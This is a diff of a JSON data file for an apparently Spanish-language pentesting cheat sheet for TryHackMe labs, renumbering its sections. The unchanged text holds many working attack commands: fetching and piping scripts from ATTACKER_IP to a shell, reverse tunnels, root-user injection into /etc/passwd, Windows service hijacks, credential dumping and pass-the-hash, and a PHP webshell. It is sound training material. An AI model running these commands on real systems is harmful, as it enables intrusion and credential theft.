       "searchText": "Acceso inicial Convertir un hallazgo en shell estable o login util. Entrada Siguiente paso SSH creds/clave chmod 600 id_rsa; ssh -i id_rsa user@$IP; ssh2john si tiene passphrase. RCE web Confirmar con id/whoami; despues reverse shell o webshell temporal. Upload ejecutable Validar ruta y ejecucion antes de payload pesado. WinRM valido evil-winrm -i $IP -u USER -p PASS. SMB escritura Buscar ejecucion indirecta: scripts, tareas, servicios, web roots. Estabilizacion Linux python3 -c 'import pty; pty.spawn(\"/bin/bash\")' CTRL+Z stty raw -echo; fg export TERM=xterm socat: listener totalmente interactivo y redireccion socat file:`tty`,raw,echo=0 tcp-listen:4444 socat tcp-listen:8001,fork tcp:INTERNAL_IP:80 Transferencia # Atacante python3 -m http.server 8000 # Linux victima wget http://ATTACKER_IP:8000/file -O /tmp/file curl http://ATTACKER_IP:8000/file -o /tmp/file # Windows victima certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe powershell -c \"iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\\Windows\\Temp\\file.exe\""
     },
     {
-      "id": "section-11",
-      "order": 11,
+      "id": "section-14",
+      "order": 14,
       "slug": "linux-privesc",
       "title": "Linux privesc",
       "summary": "De shell normal a root por permisos, tareas, configs o credenciales.",
@@ -2046,8 +2244,8 @@
       "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado (linpeas paso a paso) wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh python3 -m http.server 8000 curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Python library hijacking sudo -l python3 -c 'import sys; print(sys.path)' ls -la script.py $(dirname script.py) find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
     },
     {
-      "id": "section-12",
-      "order": 12,
+      "id": "section-15",
+      "order": 15,
       "slug": "windows-privesc",
       "title": "Windows privesc",
       "summary": "Post-exploit Windows fuera de AD.",
@@ -2314,8 +2512,8 @@
       "searchText": "Windows privesc Post-exploit Windows fuera de AD. Enumeracion inicial whoami whoami /groups whoami /priv whoami /user hostname echo %USERNAME% echo %USERDOMAIN% ver systeminfo wmic os get Caption,Version,BuildNumber,OSArchitecture wmic qfe get Caption,Description,HotFixID,InstalledOn wmic product get name,version 2>nul Automatizado (winPEAS) powershell -NoProfile -ExecutionPolicy Bypass certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\" C:\\Windows\\Temp\\winpeas.exe Servicios debiles sc query state= all wmic service get name,displayname,pathname,startmode wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" sc qc SERVICIO accesschk.exe -uwcqv \"Authenticated Users\" * accesschk.exe -uwcqv %USERNAME% SERVICIO sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\" sc stop SERVICIO sc start SERVICIO Unquoted service path wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"' dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\Vendor App\" Tareas programadas schtasks /query /fo LIST /v dir C:\\Windows\\Tasks dir C:\\Windows\\System32\\Tasks /s /b Registro / autoruns reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi Credenciales cmdkey /list dir /s /b *pass* *cred* *config* *backup* 2>nul findstr /si password *.txt *.ini *.config *.xml 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul type C:\\Windows\\Panther\\Unattended.xml 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul Token / SeImpersonate (potato) certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\" C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\" JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t * Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
     },
     {
-      "id": "section-13",
-      "order": 13,
+      "id": "section-16",
+      "order": 16,
       "slug": "active-directory",
       "title": "Active Directory",
       "summary": "Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento.",
@@ -2573,8 +2771,8 @@
       "searchText": "Active Directory Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento. En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento. export DOMAIN=dominio.local export DC_HOST=DC01 export DC_FQDN=dc01.dominio.local echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP nxc smb $IP smbclient -L //$IP -N nxc smb $IP -u 'Guest' -p '' --shares nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt Usuarios del dominio nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt impacket-lookupsid $DOMAIN/guest@$IP -no-pass ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt Password spraying nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success nxc smb $IP -u users.txt -p users.txt --no-bruteforce --continue-on-success kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!' AS-REP Roasting (sin preauth) impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt Kerberoasting (cuentas con SPN) impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.hash hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt BloodHound bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP Dump de credenciales / DCSync impacket-secretsdump $DOMAIN/$USER:$PASS@$IP impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN nxc smb $IP -u $USER -p $PASS --sam --lsa --ntds Pass-the-Hash y tickets nxc smb $IP -u $USER -H <NTLM> impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM> impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP export KRB5CCNAME=$USER.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$DC_FQDN Acceso y shell evil-winrm -i $IP -u $USER -p $PASS evil-winrm -i $IP -u $USER -H <NTLM> impacket-wmiexec $DOMAIN/$USER:$PASS@$IP impacket-smbexec $DOMAIN/$USER:$PASS@$IP ADCS (certipy) certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $IP -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN certipy auth -pfx administrator.pfx -dc-ip $IP Fase Objetivo Identificar dominio DC, FQDN, realm, clock skew y /etc/hosts correcto. Usuarios reales RID brute, LDAP, shares, naming patterns. Credenciales Spraying controlado, usuario=password, leaks en shares. Reenumerar Cada credencial nueva cambia shares, LDAP, WinRM y permisos. Kerberos AS-REP roasting, Kerberoasting, tickets, errores de hora. BloodHound Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword. Acceso WinRM, SMB exec, RDP o movimiento lateral segun permisos."
     },
     {
-      "id": "section-14",
-      "order": 14,
+      "id": "section-17",
+      "order": 17,
       "slug": "pivoting",
       "title": "Pivoting",
       "summary": "Cuando el target ve servicios que tu Kali no ve.",
@@ -2772,8 +2970,8 @@
       "searchText": "Pivoting Cuando el target ve servicios que tu Kali no ve. Situacion Tecnica Tengo SSH al pivot ssh -L para servicio concreto, ssh -D para SOCKS. No tengo SSH pero ejecuto binarios chisel reverse o ligolo-ng. Necesito escanear varios hosts ligolo-ng con interfaz tun y rutas. Solo necesito una web interna Forward local especifico. Hostnames internos Resolver DNS interno o anadir /etc/hosts. Enumerar la red interna ip a ip route ss -tulpen netstat -ano hostname -I cat /etc/hosts arp -a SSH port forwarding ssh -L 8080:127.0.0.1:80 user@$IP ssh -D 1080 -N user@$IP ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP curl http://127.0.0.1:8080 Chisel (reverse SOCKS) chisel server -p 8000 --reverse ./chisel client ATTACKER_IP:8000 R:socks ./chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80 Ligolo-ng sudo ip tuntap add user $USER mode tun ligolo sudo ip link set ligolo up ./proxy -selfcert -laddr 0.0.0.0:11601 ./agent -connect ATTACKER_IP:11601 -ignore-cert session start sudo ip route add 10.10.20.0/24 dev ligolo nmap -Pn -sT -p80,445 10.10.20.5 Proxychains echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf proxychains curl http://10.10.20.5/ proxychains nmap -sT -Pn -p80,445 10.10.20.5 proxychains nmap -sT -Pn -n -p80,445 10.10.20.5 proxychains crackmapexec smb 10.10.20.5 -u USER -p PASS DNS interno cat /etc/resolv.conf nslookup intranet.local DNS_INTERNO dig @DNS_INTERNO intranet.local echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts Valida con curl/nc antes de escanear. Con proxychains usa -sT, no SYN scan. Documenta atacante -> pivot -> red interna -> servicio."
     },
     {
-      "id": "section-15",
-      "order": 15,
+      "id": "section-18",
+      "order": 18,
       "slug": "cve-y-exploits",
       "title": "CVE y exploits",
       "summary": "Usar PoCs sin ejecutar basura a ciegas.",
@@ -2889,8 +3087,8 @@
       "searchText": "CVE y exploits Usar PoCs sin ejecutar basura a ciegas. Pregunta Decision Coincide producto exacto? Si no, baja prioridad. Coincide rango de version? Si esta fuera, descarta o busca config concreta. Requiere credenciales? Separar pre-auth de post-auth. Requiere admin? Solo sirve si ya tienes ese rol. Es destructivo? Evitar DoS/wipers salvo que el lab lo pida claramente. searchsploit PRODUCT VERSION sed -n '1,220p' exploit.py grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py python3 exploit.py -h python3 exploit.py --check --url $URL Primero reproduce la peticion minima con curl/Burp. Cambia payloads por comandos inocuos: id, whoami, hostname. Guarda fuente, version detectada, cambios hechos y output de exito. nmap -sC -sV -p PUERTO $IP curl -i $URL/ whatweb -a 3 $URL banner grab: nc -nv $IP PUERTO grep -nEi \"rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess\" exploit.py # 1. Probar reachability curl -i $URL/vulnerable/path # 2. Reproducir manualmente la parte minima curl -i -X POST $URL/endpoint -d 'param=test' # 3. Ejecutar PoC en modo check si existe file exploit.c grep -nEi \"socket|connect|system|popen|exec|fork|unlink|remove\" exploit.c gcc exploit.c -o exploit ./exploit --help mkdir -p evidence exploit notes cp exploit.py exploit/original_exploit.py script -a evidence/exploit_run.log # ejecutar prueba exit"
     },
     {
-      "id": "section-16",
-      "order": 16,
+      "id": "section-19",
+      "order": 19,
       "slug": "errores-tipicos",
       "title": "Errores tipicos",
       "summary": "Problemas frecuentes en THM y como desbloquearlos rapido.",
@@ -3062,8 +3260,8 @@
       "searchText": "Errores tipicos Problemas frecuentes en THM y como desbloquearlos rapido. Cuando algo falla, primero distingue si el problema es de conectividad, nombre/dominio, autenticacion, herramienta o interpretacion del resultado. Esta tabla es para salir del bucle rapido. Sintoma Causa probable Que probar No responde ping ICMP filtrado o VPN rara. Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento. nmap ve pocos puertos Rate alto, host filtrando o escaneo incompleto. Repetir con -Pn, bajar --min-rate, probar top ports UDP si aplica. ffuf devuelve todo 200 Wildcard o pagina catch-all. Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente. vhost no aparece Host header incorrecto o falta /etc/hosts. Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'. Reverse shell no llega LHOST mal, VPN IP incorrecta, firewall o puerto ocupado. Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP. Shell se corta TTY inestable o comando interactivo. Estabilizar con python pty, stty raw -echo, TERM=xterm. smbclient ACCESS_DENIED Formato de usuario/dominio o permisos insuficientes. Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc. Kerberos KRB_AP_ERR_SKEW Hora desincronizada. Sincronizar hora con DC; comprobar timezone; usar FQDN correcto. Cannot find KDC DNS/hosts/realm mal. Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN en mayus/minus. evil-winrm falla Puerto cerrado, formato usuario o cred invalida. nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986. SQLMap no detecta nada Request incompleta, parametro no vulnerable o WAF/filtro. Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado. PoC no funciona Version/config no coincide o requiere auth. Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp. Regla de oro Si una herramienta falla, reproduce la condicion minima con curl, nc, smbclient o nxc. Si un servicio depende de nombre, no insistas solo con IP. Si una credencial funciona en un sitio, pruebala de forma controlada en los demas servicios."
     },
     {
-      "id": "section-17",
-      "order": 17,
+      "id": "section-20",
+      "order": 20,
       "slug": "checklist-de-atasco",
       "title": "Checklist de atasco",
       "summary": "Preguntas para cuando llevas rato sin avanzar.",
@@ -3206,8 +3404,8 @@
       "searchText": "Checklist de atasco Preguntas para cuando llevas rato sin avanzar. No es una lista para hacer siempre; es una lista de rescate. Si estas atascado, vuelve a lo basico y busca una superficie que no hayas reenumerado con la informacion nueva. Pregunta Por que puede desbloquear He revisado UDP? DNS, SNMP, TFTP o NFS suelen cambiar completamente la room. He probado vhosts? Muchas webs esconden paneles o apps por Host header. He mirado robots, sitemap, JS y codigo fuente? Puede filtrar rutas, endpoints, tokens o comentarios. Tengo usuarios reales? Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse. He reenumerado con nuevas credenciales? Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB. Hay servicios solo en localhost? Puede requerir pivot o port forward tras conseguir shell. He probado cred reuse? La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo. Estoy usando hostname cuando toca? Kerberos, vhosts y apps internas pueden fallar solo por usar IP. He revisado permisos de escritura? Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles. Estoy siguiendo un falso positivo? Vuelve a evidencia: version exacta, respuesta real e impacto claro. Reset de 10 minutos cat nmap/services.txt grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null cat notes/creds.md 2>/dev/null cat notes/timeline.md 2>/dev/null Escribe en una linea cual es tu mejor hipotesis actual. Escribe que evidencia la apoya y que prueba la descartaria. Si no puedes responder eso, vuelve a enumeracion, no a exploits."
     },
     {
-      "id": "section-18",
-      "order": 18,
+      "id": "section-21",
+      "order": 21,
       "slug": "notas-y-cierre",
       "title": "Notas y cierre",
       "summary": "Que registrar para no perderte y poder repetir la cadena.",
@@ -3345,8 +3543,8 @@
       "searchText": "Notas y cierre Que registrar para no perderte y poder repetir la cadena. Plantilla minima # Room - IP: - Hostnames: - Dominio: - Puertos: - Credenciales: - Hallazgo clave: - Acceso inicial: - Escalada: - Flags: - Root cause: Registro Contenido Superficie Puerto, servicio, version, evidencia y siguiente prueba. Comando Contexto, comando, resultado importante y decision desbloqueada. Credenciales Usuario, password/hash, fuente, servicio probado y resultado. Hallazgo Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica. Cierre Comandos minimos para reproducir user/root y falsos caminos relevantes. mkdir -p nmap web loot creds hashes screenshots exploits notes touch notes/00-index.md notes/creds.md notes/commands.md notes/timeline.md - Nombre: - Plataforma: TryHackMe - Fecha: - Objetivo: - VPN/AttackBox: ## Comando Fecha/hora: Contexto: Comando: Resultado importante: Archivo de evidencia: Decision desbloqueada: | Usuario | Password/Hash | Fuente | Servicio probado | Resultado | | --- | --- | --- | --- | --- | | user | pass | /var/www/config.php | ssh/smb/web | ssh OK | 1. Recon: puertos abiertos y tecnologia. 2. Enumeracion: hallazgo clave. 3. Acceso inicial: vector exacto. 4. Post-exploit: usuario y permisos. 5. Privesc: misconfig explotada. 6. Flags: rutas y evidencia. 7. Root cause: por que funciono. ## Hallazgo - Titulo: - Impacto: - Precondiciones: - Evidencia: - Pasos reproducibles: - Comandos minimos: - Resultado: - Mitigacion teorica:"
     },
     {
-      "id": "section-19",
-      "order": 19,
+      "id": "section-22",
+      "order": 22,
       "slug": "equivalencias",
       "title": "Equivalencias",
       "summary": "Traduccion rapida de comandos entre Linux, CMD y PowerShell.",
@@ -3677,7 +3875,7 @@
       "id": "web-a-shell",
       "title": "De la web a una shell",
       "phase": "access",
-      "section": "web-y-apis",
+      "section": "web-discovery",
       "summary": "Como pasar de una pagina web a ejecutar comandos, razonando cada paso.",
       "steps": [
         {
@@ -4169,7 +4367,7 @@
       "id": "lfi",
       "title": "Local File Inclusion (LFI)",
       "phase": "enumeration",
-      "section": "web-y-apis",
+      "section": "web-ficheros-y-ejecucion",
       "summary": "La web incluye un fichero cuyo nombre controlas tu; si no lo valida, lees ficheros del servidor.",
       "que": "Una LFI ocurre cuando una pagina construye la ruta de un fichero a incluir usando un valor que viene del usuario (tipicamente un parametro como ?page=), sin comprobar que ese valor sea uno de los permitidos. El servidor entonces lee y a veces ejecuta el fichero que tu le pidas, no el que el programador esperaba.",
       "porque": "El codigo hace algo como include($_GET['page'].'.php'). El programador asume que page siempre sera 'home' o 'about', pero nada lo obliga. Si metes ../../../../etc/passwd, la funcion de inclusion resuelve esa ruta relativa y sirve el fichero. La causa raiz es confiar en la entrada del usuario para decidir que fichero abrir.",
@@ -4214,7 +4412,7 @@
       "id": "lfi-a-rce",
       "title": "De LFI a ejecucion (RCE)",
       "phase": "access",
-      "section": "web-y-apis",
+      "section": "web-ficheros-y-ejecucion",
       "summary": "Leer ficheros no es el final: si logras que el servidor incluya contenido que tu controlas, ejecutas codigo.",
       "que": "Es el salto de 'puedo leer' a 'puedo ejecutar'. Una [[lfi]] por si sola solo lee, pero si consigues que el fichero incluido contenga codigo PHP que tu has metido antes, ese codigo se ejecuta con los permisos del servidor web y obtienes ejecucion remota de comandos.",
       "porque": "include no solo lee: interpreta PHP. Si logras escribir <?php system($_GET['c']); ?> en algun sitio del servidor y luego apuntas la LFI a ese sitio, el include ejecuta tu payload. Los sitios clasicos donde puedes 'inyectar' ese contenido son ficheros que el servidor escribe con datos tuyos: logs de acceso, ficheros de sesion, cabeceras guardadas o subidas de fichero mal filtradas.",
